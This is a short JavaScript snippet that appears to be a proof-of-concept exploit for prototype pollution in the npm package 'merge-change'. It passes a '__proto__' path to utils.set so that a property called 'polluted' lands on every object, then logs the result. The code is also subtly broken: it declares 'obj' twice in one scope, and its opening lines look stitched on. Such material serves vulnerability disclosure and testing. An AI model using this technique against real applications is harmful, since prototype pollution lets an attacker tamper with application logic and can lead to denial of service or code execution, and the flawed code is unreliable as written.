var obj = {};
obj.constructor.prototype.polluted = undefined;
Object.defineProperty(obj, 'constructor', {
    value: obj.constructor,
    writable: true,
    enumerable: true,
    configurable: true
});
const utils = require('merge-change').utils;
console.log({}.polluted);
let obj = {};
utils.set(obj, [
    '__proto__',
    'polluted'
], 'yes');
console.log({}.polluted);